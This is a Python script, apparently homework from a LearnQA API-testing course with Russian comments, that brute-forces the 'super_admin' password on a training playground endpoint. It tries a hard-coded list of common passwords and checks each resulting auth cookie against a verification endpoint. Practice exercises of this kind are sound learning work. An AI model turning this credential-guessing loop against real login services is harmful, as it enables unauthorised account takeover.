import requests

url1 = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
url_verify = 'https://playground.learnqa.ru/ajax/api/check_auth_cookie'

payload = {'login': 'super_admin', 'password': ''}
response = requests.post(url1, data=payload)
print(response.status_code)
auth_cookie = dict(response.cookies)
print(auth_cookie)
response2 = requests.post(url_verify, data=auth_cookie)
print(response2.text)


# Убрала дубли через xls и положила пароли в переменную
get_password = {'1234567',
                'trustno1',
                'dragon',
                'password',
                'bailey',
                'ashley',
                '654321',
                'abc123',
                'shadow',
                'monkey',
                '123456',
                'Football',
                'iloveyou',
                'baseball',
                'master',
                'qazwsx',
                'letmein',
                'passw0rd',
                'qwerty',
                'michael',
                'superman',
                '12345678',
                '111111',
                'sunshine',
                '123123',
                'adobe123[a]',
                '1234',
                'password1',
                '123456789',
                '0',
                '1234567890',
                'azerty',
                'princess',
                'admin',
                'photoshop[a]',
                '12345',
                'starwars',
                'welcome',
                'solo',
                'qwertyuiop',
                '1qaz2wsx',
                'login',
                'hello',
                'whatever',
                'freedom',
                '12345',
                '111111',
                '123123',
                '555555',
                '654321',
                '888888',
                '1234567',
                '7777777',
                '123456789',
                '123qwe',
                '1q2w3e4r',
                'lovely',
                'qwerty123',
                'jesus',
                'ninja',
                'mustang',
                'access',
                '12345678',
                'batman',
                '696969',
                'flower',
                '121212',
                'loveme',
                'zaq1zaq1',
                'hottie',
                'charlie',
                '666666',
                'donald',
                'aa123456',
                '!@#$%^&*'}

# Циклом прошлась по паролям
for i in get_password:
    payload = {'login': 'super_admin', 'password': i}
    # print(payload)
    response3 = requests.post(url1, data=payload)
    # print(dict(response3.cookies))
    # с помощью гет получаем куки из переменной
    cookie_value = response3.cookies.get('auth_cookie')
    # print(cookie_value)
    # создали пустой массив
    cookies = {}
    # убедились, что куки не является Нан
    if cookie_value is not None:
        # только в этом случае добавляем ее в переменную апдейтом
        cookies.update({'auth_cookie': cookie_value})
    # создаем словарь для авторизованной куки, делаем запрос
    response4 = requests.post(url_verify, cookies=cookies)
    # print(response4.text)
    # выводим результат, если он совпадает со строкой
    if response4.text == 'You are authorized':
        print({'password': i})
        # {'password': 'welcome'}
